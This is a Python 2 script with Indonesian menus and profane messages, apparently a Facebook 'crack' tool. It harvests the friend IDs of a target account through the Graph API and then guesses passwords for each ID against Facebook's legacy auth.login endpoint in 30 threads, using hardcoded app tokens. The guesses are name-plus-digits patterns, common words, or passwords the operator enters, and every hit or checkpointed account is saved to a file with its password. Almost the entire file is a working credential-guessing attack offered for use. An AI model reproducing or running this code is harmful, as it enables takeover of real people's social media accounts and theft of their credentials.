#!/usr/bin/python2
# coding=utf-8

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
	print ("{!} Keluar");time.sleep(0.01)
	os.sys.exit()

def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)

def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

logo = """\033[1;92m  ║\033[1;91m████████
\033[1;92m  ║\033[1;97m████████
\033[1;92m  ║
  😋
  ║
  ║
  ║
\033[1;92m  ║
\033[1;92m  ║
\033[1;92m  ║
\033[1;92m_/ \_\033[1;39m"""

back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
id = []

def tokenz():
	os.system('clear')
	print (logo);time.sleep(0.01)
	print ("───────────────────────────────────────────");time.sleep(0.07)
	toket = raw_input("{☆} Enter Token : ");time.sleep(0.01)
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		jalan ('Login Succes...');time.sleep(0.01)
		menu()
	except KeyError:
		print ("{!} Tokenlu Salah Kontol!");time.sleep(0.07)
		os.system('rm -rf login.txt')
		time.sleep(2)
		tokenz()
	except requests.exceptions.ConnectionError:
		print ("{!} Internet tolol");time.sleep(0.01)
		keluar()

def menu():
	os.system('clear')
	try:
		toket = open('login.txt','r').read()
	except IOError:
		os.system('clear')
		os.system('rm -rf login.txt')
		tokenz()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print ("{!} Token Eror");time.sleep(0.07)
		os.system('rm -rf login.txt')
		time.sleep(1)
		tokenz()
	except requests.exceptions.ConnectionError:
		print ("{!} Tidak Ada Koneksi Internet");time.sleep(0.07)
		keluar()
	os.system("clear")
	print (logo);time.sleep(0.01)
	print ("───────────────────────────────────────────");time.sleep(0.07)
	jalan ("{✪} Nama : "+nama);time.sleep(0.01)
	jalan ("{✪} Id   : "+id);time.sleep(0.01)
	print ("───────────────────────────────────────────");time.sleep(0.07)
	print ("{1} Crack Indonesia");time.sleep(0.01)
	print ("{2} Crack Buat Sandi");time.sleep(0.01)
	print ("{3} Dumps Publik");time.sleep(0.01)
	print ("{0} Keluar");time.sleep(0.01)
	print ("───────────────────────────────────────────");time.sleep(0.07)
	pilih()

def pilih():
	unikers = raw_input("︻デ═一▸ ");time.sleep(0.01)
	if unikers =="":
		print ("{!} Salah Lo Kontol");time.sleep(0.01)
		pilih()
	elif unikers =="1" or unikers =="01":
		crack_indo()
	elif unikers =="2" or unikers =="02":
		crack_sandi()
	elif unikers =="3" or unikers =="03":
		dump_id()
	elif unikers =="0" or unikers =="00":
		os.system('clear')
		jalan ('Menghapus Token...');time.sleep(0.07)
		os.system('rm -rf login.txt')
		keluar()
	else:
		print ("{!} Salah Kontol");time.sleep(0.07)
		pilih()

def crack_indo():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print ("{!} Token Eror");time.sleep(0.07)
		os.system('rm -rf login.txt')
		time.sleep(1)
		tokenz()
	os.system('clear')
	print (logo);time.sleep(0.07)
	print ("───────────────────────────────────────────");time.sleep(0.07)
	print ("{1} Crack Id Publik");time.sleep(0.01)
	print ("{2} Crack Dari File");time.sleep(0.01)
	print ("{0} Kembali");time.sleep(0.01)
	print ("───────────────────────────────────────────");time.sleep(0.07)
	pilih_indo()

def pilih_indo():
	teak = raw_input("︻デ═一▸ ");time.sleep(0.01)
	if teak =="":
		print ("{!} Isi Yang Benar");time.sleep(0.01)
		pilih_indo()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print (logo);time.sleep(0.07)
		print ("───────────────────────────────────────────");time.sleep(0.07)
		idt = raw_input("{✪} Enter ID : ");time.sleep(0.01)
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print ("{☆} Nama : "+sp["name"]);time.sleep(0.01)
		except KeyError:
			print ("{!} ID GA ADA KONTOL");time.sleep(0.01)
			raw_input("{Kembali}");time.sleep(0.01)
			crack_indo()
		except requests.exceptions.ConnectionError:
			print ("{!} Internetlu Kek Pepek");time.sleep(0.01)
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print (logo);time.sleep(0.07)
		try:
			print ("───────────────────────────────────────────");time.sleep(0.01)
			idlist = raw_input('{✪} Nama File : ');time.sleep(0.01)
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print ('{!} File Gaada Kontol');time.sleep(0.01)
			raw_input("{Kembali}");time.sleep(0.01)
			crack_indo()
		except IOError:
			print ('{!} File Gaada Kontol');time.sleep(0.07)
			raw_input("{Kembali}");time.sleep(0.01)
			crack_indo()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print ("{!} Isi Yang Benar");time.sleep(0.07)
		pilih_indo()
	print ("{✪} Total ID : ")+str(len(id));time.sleep(0.07)
	print ('{✪} Stop Tekan CTRL+Z');time.sleep(0.07)
	titik = ['.   ','..  ','... ']
	for o in titik:
		print ("\r{✪} Crack Berjalan"+o),;sys.stdout.flush();time.sleep(1)
	print ("\n───────────────────────────────────────────");time.sleep(0.07)

	def main(arg):
		global cekpoint,oks
		zowe = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("🤙 Berhasil");time.sleep(0.07)
				print ("{!} Nama      : "+j['name']);time.sleep(0.07)
				print ("{!} User      : "+zowe);time.sleep(0.07)
				print ("{!} Password  : "+bos1);time.sleep(0.07)
				oke = open("out/indo.txt", "a")
				oke.write("OK "+zowe+" Φ "+bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("😓 Cekpoint");time.sleep(0.07)
					print ("{!} Nama      : "+j['name']);time.sleep(0.07)
					print ("{!} User      : "+zowe);time.sleep(0.07)
					print ("{!} Password  : "+bos1);time.sleep(0.07)
					cek = open("out/indo.txt", "a")
					cek.write("CP "+zowe+" Φ "+bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name']+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("🤙 Berhasil");time.sleep(0.07)
						print ("{!} Nama      : "+j['name']);time.sleep(0.07)
						print ("{!} User      : "+zowe);time.sleep(0.07)
						print ("{!} Password  : "+bos2);time.sleep(0.07)
						oke = open("out/indo.txt", "a")
						oke.write("OK "+zowe+" Φ "+bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("😓 Cekpoint");time.sleep(0.07)
							print ("{!} Nama      : "+j['name']);time.sleep(0.07)
							print ("{!} User      : "+zowe);time.sleep(0.07)
							print ("{!} Password  : "+bos2);time.sleep(0.07)
							cek = open("out/indo.txt", "a")
							cek.write("CP "+zowe+" Φ "+bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name']+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("🤙 Berhasil");time.sleep(0.07)
								print ("{!} Nama      : "+j['name']);time.sleep(0.07)
								print ("{!} User      : "+zowe);time.sleep(0.07)
								print ("{!} Password  : "+bos3);time.sleep(0.07)
								oke = open("out/indo.txt", "a")
								oke.write("OK "+zowe+" Φ "+bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("😓 Cekpoint");time.sleep(0.07)
									print ("{!} Nama      : "+j['name']);time.sleep(0.07)
									print ("{!} User      : "+zowe);time.sleep(0.07)
									print ("{!} Password  : "+bos3);time.sleep(0.07)
									cek = open("out/indo.txt", "a")
									cek.write("CP "+zowe+" Φ "+bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = 'Sayang'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("🤙 Berhasil");time.sleep(0.07)
										print ("{!} Nama      : "+j['name']);time.sleep(0.07)
										print ("{!} User      : "+zowe);time.sleep(0.07)
										print ("{!} Password  : "+bos4);time.sleep(0.07)
										oke = open("out/indo.txt", "a")
										oke.write("OK "+zowe+" Φ "+bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("😓 Cekpoint");time.sleep(0.07)
											print ("{!} Nama      : "+j['name']);time.sleep(0.07)
											print ("{!} User      : "+zowe);time.sleep(0.07)
											print ("{!} Password  : "+bos4);time.sleep(0.07)
											cek = open("out/indo.txt", "a")
											cek.write("CP "+zowe+" Φ "+bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = 'Anjing'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("🤙 Berhasil");time.sleep(0.07)
												print ("{!} Nama      : "+j['name']);time.sleep(0.07)
												print ("{!} User      : "+zowe);time.sleep(0.07)
												print ("{!} Password  : "+bos5);time.sleep(0.07)
												oke = open("out/indo.txt", "a")
												oke.write("OK "+zowe+" Φ "+bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("😓 Cekpoint");time.sleep(0.07)
													print ("{!} Nama      : "+j['name']);time.sleep(0.07)
													print ("{!} User      : "+zowe);time.sleep(0.07)
													print ("{!} Password  : "+bos5);time.sleep(0.07)
													cek = open("out/indo.txt", "a")
													cek.write("CP "+zowe+" Φ "+bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = 'Bajingan'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("🤙 Berhasil");time.sleep(0.07)
														print ("{!} Nama      : "+j['name']);time.sleep(0.07)
														print ("{!} User      : "+zowe);time.sleep(0.07)
														print ("{!} Password  : "+bos6);time.sleep(0.07)
														oke = open("out/indo.txt", "a")
														oke.write("OK "+zowe+" Φ "+bos6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("😓 Cekpoint");time.sleep(0.07)
															print ("{!} Nama      : "+j['name']);time.sleep(0.07)
															print ("{!} User      : "+zowe);time.sleep(0.07)
															print ("{!} Password  : "+bos6);time.sleep(0.07)
															cek = open("out/indo.txt", "a")
															cek.write("CP "+zowe+" Φ "+bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
														else:
															bos7 = 'Bismillah'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															ko = json.load(data)
															if 'access_token' in ko:
																print ("🤙 Berhasil");time.sleep(0.07)
																print ("{!} Nama      : "+j['name']);time.sleep(0.07)
																print ("{!} User      : "+zowe);time.sleep(0.07)
																print ("{!} Password  : "+bos7);time.sleep(0.07)
																oke = open("out/indo.txt", "a")
																oke.write("OK "+zowe+" Φ "+bos7+"\n")
																oke.close()
																oks.append(zowe)
															else:
																if 'www.facebook.com' in ko['error_msg']:
																	print ("😓 Cekpoint");time.sleep(0.07)
																	print ("{!} Nama      : "+j['name']);time.sleep(0.07)
																	print ("{!} User      : "+zowe);time.sleep(0.07)
																	print ("{!} Password  : "+bos7);time.sleep(0.07)
																	cek = open("out/indo.txt", "a")
																	cek.write("CP "+zowe+" Φ "+bos7+"\n")
																	cek.close()
																	cekpoint.append(zowe)
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print ("───────────────────────────────────────────");time.sleep(0.07)
	print ('{☆} Selesai...');time.sleep(0.07)
	print ("{☆} Total OK/CP : ")+str(len(oks))+"/"+str(len(cekpoint));time.sleep(0.07)
	print ('{☆} OK/CP file tersimpan : out/indo.txt');time.sleep(0.07)
	raw_input("{Kembali}");time.sleep(0.07)
	menu()

def crack_sandi():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('{!}Token Eror');time.sleep(0.07)
        os.system('rm -rf login.txt')
        time.sleep(1)
        tokenz()
    os.system('clear')
    print (logo);time.sleep(0.07)
    print ("───────────────────────────────────────────");time.sleep(0.07)
    print ('{1} Crack Id Publik');time.sleep(0.07)
    print ('{2} Crack Dari File');time.sleep(0.07)
    print ('{0} Kembali');time.sleep(0.07)
    print ("───────────────────────────────────────────");time.sleep(0.07)
    pilih_sandi()

def pilih_sandi():
    weak = raw_input("︻デ═一▸ ");time.sleep(0.07)
    if weak == '':
        print ('{!} Isi Yang Benar');time.sleep(0.07)
        pilih_sandi()
    else:
        if weak == '1' or weak == '01':
            os.system('clear')
            print (logo);time.sleep(0.07)
            print ("───────────────────────────────────────────");time.sleep(0.07)
            sandi1 = raw_input('{+} Sandi1 : ');time.sleep(0.07)
            sandi2 = raw_input('{+} Sandi2 : ');time.sleep(0.07)
            sandi3 = raw_input('{+} Sandi3 : ');time.sleep(0.07)
            sandi4 = raw_input('{+} Sandi4 : ');time.sleep(0.07)
            sandi5 = raw_input('{+} Sandi5 : ');time.sleep(0.07)
            sandi6 = raw_input('{+} Sandi6 : ');time.sleep(0.07)
            print ("───────────────────────────────────────────");time.sleep(0.07)
            idt = raw_input('{☆} Enter ID : ');time.sleep(0.07)
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print ('{☆} Nama : '+op['name']);time.sleep(0.07)
            except KeyError:
                print ('{!} Id Tidak Di Temukan');time.sleep(0.07)
                raw_input("{Kembali}");time.sleep(0.07)
                crack_sandi()
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])
        elif weak == '2' or weak == '02':
            os.system('clear')
            print (logo);time.sleep(0.07)
            try:
                print ("───────────────────────────────────────────");time.sleep(0.07)
                sandi1 = raw_input('{+} Sandi1 : ');time.sleep(0.07)
                sandi2 = raw_input('{+} Sandi2 : ');time.sleep(0.07)
                sandi3 = raw_input('{+} Sandi3 : ');time.sleep(0.07)
                sandi4 = raw_input('{+} Sandi4 : ');time.sleep(0.07)
                sandi5 = raw_input('{+} Sandi5 : ');time.sleep(0.07)
                sandi6 = raw_input('{+} Sandi6 : ');time.sleep(0.07)
                print ("───────────────────────────────────────────");time.sleep(0.07)
                idlist = raw_input('{☆} Nama File : ');time.sleep(0.07)
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())
            except KeyError:
                print ('{!} File Tidak Ada');time.sleep(0.07)
                raw_input("{Kembali}");time.sleep(0.07)
                crack_sandi()
            except IOError:
                print ('{!} File Tidak Ada');time.sleep(0.07)
                raw_input("{Kembali}");time.sleep(0.07)
                crack_sandi()
        elif weak == '0' or weak == '00':
            menu()
        else:
            print ('{!} Isi Yang Benar');time.sleep(0.07)
            pilih_sandi()
        print ('{☆} Total ID : ')+str(len(id));time.sleep(0.07)
        print ('{☆} Stop Tekan CTRL+Z');time.sleep(0.07)
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print ("\r{☆} Crack Berjalan"+o),;sys.stdout.flush();time.sleep(1)
    print ("\n───────────────────────────────────────────");time.sleep(0.07)

    def main(arg):
        zowe = arg
        try:
            os.mkdir('out')
        except OSError:
            pass
        try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(sandi1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("✔️ Berhasil");time.sleep(0.07)
				print ("{!} Nama      : "+j['name']);time.sleep(0.07)
				print ("{!} User      : "+zowe);time.sleep(0.07)
				print ("{!} Password  : "+sandi1);time.sleep(0.07)
				oke = open("out/sandi.txt", "a")
				oke.write("OK "+zowe+" Φ "+sandi1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("❌ Cekpoint");time.sleep(0.07)
					print ("{!} Nama      : "+j['name']);time.sleep(0.07)
					print ("{!} User      : "+zowe);time.sleep(0.07)
					print ("{!} Password  : "+sandi1);time.sleep(0.07)
					cek = open("out/sandi.txt", "a")
					cek.write("CP "+zowe+" Φ "+sandi1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(sandi2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("✔️ Berhasil");time.sleep(0.07)
						print ("{!} Nama      : "+j['name']);time.sleep(0.07)
						print ("{!} User      : "+zowe);time.sleep(0.07)
						print ("{!} Password  : "+sandi2);time.sleep(0.07)
						oke = open("out/sandi.txt", "a")
						oke.write("OK "+zowe+" Φ "+sandi2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("❌ Cekpoint");time.sleep(0.07)
							print ("{!} Nama      : "+j['name']);time.sleep(0.07)
							print ("{!} User      : "+zowe);time.sleep(0.07)
							print ("{!} Password  : "+sandi2);time.sleep(0.07)
							cek = open("out/sandi.txt", "a")
							cek.write("CP "+zowe+" Φ "+sandi2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(sandi3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("✔️ Berhasil");time.sleep(0.07)
								print ("{!} Nama      : "+j['name']);time.sleep(0.07)
								print ("{!} User      : "+zowe);time.sleep(0.07)
								print ("{!} Password  : "+sandi3);time.sleep(0.07)
								oke = open("out/sandi.txt", "a")
								oke.write("OK "+zowe+" Φ "+sandi3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("❌ Cekpoint");time.sleep(0.07)
									print ("{!} Nama      : "+j['name']);time.sleep(0.07)
									print ("{!} User      : "+zowe);time.sleep(0.07)
									print ("{!} Password  : "+sandi3);time.sleep(0.07)
									cek = open("out/sandi.txt", "a")
									cek.write("CP "+zowe+" Φ "+sandi3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(sandi4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("✔️ Berhasil");time.sleep(0.07)
										print ("{!} Nama      : "+j['name']);time.sleep(0.07)
										print ("{!} User      : "+zowe);time.sleep(0.07)
										print ("{!} Password  : "+sandi4);time.sleep(0.07)
										oke = open("out/sandi.txt", "a")
										oke.write("OK "+zowe+" Φ "+sandi4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("❌ Cekpoint");time.sleep(0.07)
											print ("{!} Nama      : "+j['name']);time.sleep(0.07)
											print ("{!} User      : "+zowe);time.sleep(0.07)
											print ("{!} Password  : "+sandi4);time.sleep(0.07)
											cek = open("out/sandi.txt", "a")
											cek.write("CP "+zowe+" Φ "+sandi4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(sandi5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("✔️ Berhasil");time.sleep(0.07)
												print ("{!} Nama      : "+j['name']);time.sleep(0.07)
												print ("{!} User      : "+zowe);time.sleep(0.07)
												print ("{!} Password  : "+sandi5);time.sleep(0.07)
												oke = open("out/sandi.txt", "a")
												oke.write("OK "+zowe+" Φ "+sandi5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("❌ Cekpoint");time.sleep(0.07)
													print ("{!} Nama      : "+j['name']);time.sleep(0.07)
													print ("{!} User      : "+zowe);time.sleep(0.07)
													print ("{!} Password  : "+sandi5);time.sleep(0.07)
													cek = open("out/sandi.txt", "a")
													cek.write("CP "+zowe+" Φ "+sandi5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(sandi6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("✔️ Berhasil");time.sleep(0.07)
														print ("{!} Nama      : "+j['name']);time.sleep(0.07)
														print ("{!} User      : "+zowe);time.sleep(0.07)
														print ("{!} Password  : "+sandi6);time.sleep(0.07)
														oke = open("out/sandi.txt", "a")
														oke.write("OK "+zowe+" Φ "+sandi6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("❌ Cekpoint");time.sleep(0.07)
															print ("{!} Nama      : "+j['name']);time.sleep(0.07)
															print ("{!} User      : "+zowe);time.sleep(0.07)
															print ("{!} Password  : "+sandi6);time.sleep(0.07)
															cek = open("out/sandi.txt", "a")
															cek.write("CP "+zowe+" Φ "+sandi6+"\n")
															cek.close()
															cekpoint.append(zowe)
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print ("───────────────────────────────────────────");time.sleep(0.07)
    print ('{☆} Selesai...');time.sleep(0.07)
    print ("{☆} Total OK/CP : ")+str(len(oks))+"/"+str(len(cekpoint));time.sleep(0.07)
    print ('{☆} OK/CP file tersimpan : out/sandi.txt');time.sleep(0.07)
    raw_input("{Kembali}");time.sleep(0.07)
    menu()

def dump_id():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print ("{!} Token Eror");time.sleep(0.07)
		os.system('rm -rf login.txt')
		time.sleep(1)
		tokenz()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print (logo);time.sleep(0.07)
		print ("───────────────────────────────────────────");time.sleep(0.07)
		idt = raw_input("{☆} Enter ID : ");time.sleep(0.07)
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print ("{☆} Nama : "+op["name"]);time.sleep(0.07)
		except KeyError:
			print ("{!} Id Tidak Ada");time.sleep(0.07)
			raw_input("{Kembali}");time.sleep(0.07)
			dump_id()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(9999999)&access_token="+toket)
		z=json.loads(r.text)
		jalan ('{☆} Mengambil Semua Id...');time.sleep(0.07)
		print ("───────────────────────────────────────────");time.sleep(0.07)
		bz = open('out/id_publik.txt','w')
		for a in z['friends']['data']:
			id.append(a['id'])
			bz.write(a['id']+'\n')
			print ("\r{"+str(len(id))+"}"),;sys.stdout.flush();time.sleep(0.0050)
			print (a['id'])
		bz.close()
		print ("───────────────────────────────────────────");time.sleep(0.07)
		done = raw_input("{☆} Simpan Nama File : ");time.sleep(0.07)
		os.rename('out/id_publik.txt','out/'+done);time.sleep(0.07)
		print ("{☆} File Tersimpan : out/"+done);time.sleep(0.07)
		raw_input("{Kembali}");time.sleep(0.07)
		menu()
	except KeyError:
		print ('{!} Teman Tidak Ada');time.sleep(0.07)
		raw_input("{Kembali}");time.sleep(0.07)
		dump_id()

if __name__=='__main__':
	menu()
